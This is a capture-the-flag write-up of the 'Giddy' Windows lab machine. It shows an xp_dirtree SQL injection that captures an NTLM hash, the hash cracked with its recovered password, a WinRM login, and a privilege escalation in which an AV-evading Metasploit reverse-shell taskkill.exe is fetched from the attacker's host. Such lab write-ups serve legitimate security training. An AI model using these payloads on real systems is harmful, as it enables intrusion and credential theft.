## Intro

Tags: #windows #NotAssumedBreach #webapp #SQL-injection  #oscppath #medium

---

# Reconnaissance

## Add target to hosts

```bash
echo '10.129.96.140 giddy.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Quick open TCP ports discovery

```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n giddy.htb
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-16 05:57 CDT
Nmap scan report for giddy.htb (10.129.96.140)
Host is up (0.0073s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

here the only service thats worth diving deeper seems port 80, the others are https, rdp, winrm

### Targeted nmap scan towards open TCP ports

```bash
sudo nmap -p80,443,3389,5985 -A giddy.htb
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-16 05:58 CDT
Nmap scan report for giddy.htb (10.129.96.140)
Host is up (0.0076s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2026-04-16T10:59:10+00:00; -1s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2026-04-16T10:59:05+00:00
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2026-04-15T10:52:49
|_Not valid after:  2026-10-15T10:52:49
|_ssl-date: 2026-04-16T10:59:10+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 3389/tcp)
HOP RTT     ADDRESS
1   7.33 ms 10.10.14.1
2   7.71 ms giddy.htb (10.129.96.140)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
```

## Port 80 - IIS web server

navigated to `https://giddy.htb`  ,the home page has this picture of a cute dog! and when clicked goes here `https://www.iis.net/?utm_medium=iis-deployment`

### Enumerate directories

nothing else seems obvious, so lets enumerate directories, i will scan both `http` and `https`

First `http`
```bash
gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://giddy.htb
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://giddy.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://giddy.htb/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
http://giddy.htb/mvc                  (Status: 301) [Size: 144] [--> http://giddy.htb/mvc/]
http://giddy.htb/Remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fRemote]
```

same output for`https`

so lets explore the found directories:

navigating on `remote` directory:
```bash
 http://giddy.htb/remote/
```

redirects here:
```bash
 http://giddy.htb/Remote/en-US/logon.aspx?ReturnUrl=%2fremote
```

![giddy_image.png](giddy_image.png)

and there is a login page, that has an interesting title `Windows PowerShell Web Access`

navigating on `mvc` directory:
```bash
 http://giddy.htb/mvc
```

this seems like a blog webapp, that seems to have some list of products

---

# Foothold

## SQL injection

### Identifying SQLi

by clicking a random product, i noticed that the url becomes:

```bash
http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=31
```

### Dump database attempt

used sqlmap for this but no luck

```bash
sqlmap -r giddy.request --dbms mssql --risk 3 --level 5 --batch --dbs
```

### Out-of-Band SQL Injection

Now to check if the web application is vulnerable to SQL injection or not, we add a single quote at the end

```bash
http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=31`
```

aand got error! `Server Error in '/mvc' Application.`

![giddy_image.png](giddy_image%201.png)

thats exactly what i was looking for ! its an `SQL related error` :

```powershell
[SqlException (0x80131904): Unclosed quotation mark after the character string ''.]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +3180428
```

thats great! also i found same error on the `search` functionality of the webapp by similary inserting an ` on the end of the term i searched.

#### NTLM hash capture

we can get the host to connect to us and try to authenticate using smb

we can add sth like this in the url

```bash
; EXEC master ..xp_dirtree '\\10.10.14.217\test'; --
```

then the url becomes:

```bash
https://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=31;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.217\test%22;%20--
```

```bash
sudo responder -I tun0
```

#### hash obtained

```powershell
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:51b38e852aa92ff9:D1B73EE88E90B34D30132E21191923DE:010100000000000000D201367CCDDC0122D9C43056FE04220000000002000800450056005000480001001E00570049004E002D005A0044004E005800360048004D00340045005500580004003400570049004E002D005A0044004E005800360048004D0034004500550058002E0045005600500048002E004C004F00430041004C000300140045005600500048002E004C004F00430041004C000500140045005600500048002E004C004F00430041004C000700080000D201367CCDDC0106000400020000000800300030000000000000000000000000300000D11133F50A2C319667E626BC57748083C84E3C3756011C871221554F0237B7D20A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00320031003700000000000000000000000000
```

```powershell
Stacy::GIDDY:51b38e852aa92ff9:D1B73EE88E90B34D30132E21191923DE:010100000000000000D201367CCDDC0122D9C43056FE04220000000002000800450056005000480001001E00570049004E002D005A0044004E005800360048004D00340045005500580004003400570049004E002D005A0044004E005800360048004D0034004500550058002E0045005600500048002E004C004F00430041004C000300140045005600500048002E004C004F00430041004C000500140045005600500048002E004C004F00430041004C000700080000D201367CCDDC0106000400020000000800300030000000000000000000000000300000D11133F50A2C319667E626BC57748083C84E3C3756011C871221554F0237B7D20A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00320031003700000000000000000000000000
```

### Hash cracking NTLMv2-SSP

```bash
hashcat -m 5600 giddy_stacy.hash /usr/share/wordlists/rockyou.txt
```

cracked successfully

```powershell
STACY::GIDDY:51b38e852aa92ff9:d1b73ee88e90b34d30132e21191923de:010100000000000000d201367ccddc0122d9c43056fe04220000000002000800450056005000480001001e00570049004e002d005a0044004e005800360048004d00340045005500580004003400570049004e002d005a0044004e005800360048004d0034004500550058002e0045005600500048002e004c004f00430041004c000300140045005600500048002e004c004f00430041004c000500140045005600500048002e004c004f00430041004c000700080000d201367ccddc0106000400020000000800300030000000000000000000000000300000d11133f50a2c319667e626bc57748083c84e3c3756011c871221554f0237b7d20a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003700000000000000000000000000:xNnWo6272k7x
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

#### creds obtained

```bash
stacy
xNnWo6272k7x
```

## Shell as user (stacy)

```powershell
evil-winrm -i giddy.htb -u 'stacy' -p 'xNnWo6272k7x'
```

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Desktop> type user.txt
dd9fea7bc2dc4c9829a1fae20d609378
*Evil-WinRM* PS C:\Users\Stacy\Desktop> whoami
giddy\stacy
*Evil-WinRM* PS C:\Users\Stacy\Desktop> hostname
Giddy
*Evil-WinRM* PS C:\Users\Stacy\Desktop> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.96.140
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
```

## Why did this work?

This is an **Out-of-Band SQL Injection (OOB SQLi)** attack that abuses a Microsoft SQL Server stored procedure (`xp_dirtree`) to force the database server to initiate an external network connection.

By injecting a malicious SQL payload into a web request, the attacker causes the SQL Server to access a remote **SMB share (UNC path)** under their control. When this happens, the server automatically attempts **Windows authentication (NTLM)** to the attacker’s machine.

### **Impact**

- Triggers **NTLM authentication from the SQL Server**
- Allows the attacker to **capture NTLM challenge-response hashes**
- Can be used for:
    - **Credential harvesting**
    - **Offline password cracking**
    - **NTLM relay attacks** (if protections like SMB signing are not enforced)

So in few words:

An Out-of-Band SQL Injection leveraging `xp_dirtree` to induce SMB authentication, enabling NTLM hash capture and potential relay attacks.

---

# Privesc

## Filesystem enumeration

i searched all directories of stacy, and in Documents i found this, which does not appear to be a systemic file

```powershell
*Evil-WinRM* PS C:\Users\stacy\Documents> dir

    Directory: C:\Users\stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
```

this file seems to be related to “Unifi video”, so lets try searching online for exploits affecting it:

```bash
└──╼ [★]$ searchsploit unifi video
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Ubiquiti Networks UniFi Video Default - 'cros | php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Privilege  | windows/local/43390.txt
---------------------------------------------- --------------------------------
```

by downloading the `43390` , i found inside this:

```bash
Upon start and stop of the service, it tries to load and execute the file at “C:\ProgramData\unifi-video\taskkill.exe”. However this file does not exist in the application directory by default at all.
By copying an arbitrary “taskkill.exe” to “C:\ProgramData\unifi-video" as an unprivileged user, it is therefore possible to escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM.
```

so we need to create a malicious `taskkill.exe` and place it on `C:\ProgramData\unifi-video`

## Exploiting vulnerable program

Lets exploit unifivideo according to `43390` :

### 1. kill the service:

```powershell
stop-service -name UniFivideoservice
```

### 2. Create malicious exe to evade windows

```powershell
[msf](Jobs:0 Agents:0) >> use evasion/windows/windows_defender_exe
[msf](Jobs:0 Agents:0) evasion(windows/windows_defender_exe) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) evasion(windows/windows_defender_exe) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) evasion(windows/windows_defender_exe) >> set lport 443
lport => 443
[msf](Jobs:0 Agents:0) evasion(windows/windows_defender_exe) >> run
[*] Compiled executable size: 3584
[+] DvQuvO.exe stored at /home/ch3ckm8/.msf4/local/DvQuvO.exe
[msf](Jobs:0 Agents:0) evasion(windows/windows_defender_exe) >> 
```

### 3. transfer on program’s directory

```bash
python3 -m http.server 8001
```

now navigate to this dir and transfer

```powershell
C:\ProgramData\unifi-video
```

```powershell
wget http://10.10.14.217:8001/DvQuvO.exe -o taskkill.exe
```

### 4. Setup listener

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost tun0
msf5 exploit(multi/handler) > set lport 9001
msf5 exploit(multi/handler) > run
```

### 5. start the service

```powershell
start-service unifivideoservice
```

## Shell as system

then got meterpreter shell! and grabbed root flag

```powershell
[*] Started reverse TCP handler on 10.10.14.217:9001 
[*] Sending stage (177734 bytes) to 10.129.96.140
[*] Meterpreter session 1 opened (10.10.14.217:9001 -> 10.129.96.140:49755) at 2026-04-16 09:34:57 -0500

(Meterpreter 1)(C:\ProgramData\unifi-video) > sysinfo
Computer        : GIDDY
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
(Meterpreter 1)(C:\ProgramData\unifi-video) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 1)(C:\ProgramData\unifi-video) > shell
Process 3636 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>cd ..
cd ..

C:\ProgramData>echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"

User: GIDDY$ 
Hostname: GIDDY 
Whoami: 
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Giddy
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-94-94-A1
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.129.96.140(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, April 16, 2026 6:55:53 AM
   Lease Expires . . . . . . . . . . : Thursday, April 16, 2026 11:24:21 AM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
Root.txt Content: 
dc94798abe7dc5409d15f7bccc7ab89b
```

---

# Summary

## wyrmgaze

| # | inputs | action | results |
| --- | --- | --- | --- |
| 1 | target | nmap | port 80, port 443, port 3389, port 3389 |
| 2 | port 80 | enumerate directories | dir:remote, dir:mvc |
| 3 | dir:mvc | Out-of-Band SQL Injection | hash, user1 |
| 4 | hash | crack | pass1 |
| 5 | user1, pass1 | login | winrm1 |
| 6 | winrm1 | login | user1 |
| 7 | user1 | filesystem enum | non-systemic-app |
| 8 | non-systemic-app | exploit | Administrator |

![giddy_image.png](giddy_image%202.png)

---

# Sidenotes

A really interesting machine, the Out-of-Band SQL Injection part was unknown to me so it immediately makes this one an important addition to my oscp notes. Also the privesc part was kinda easy tho it needed some manual navigation on the filesystem, making it a decent box overall.
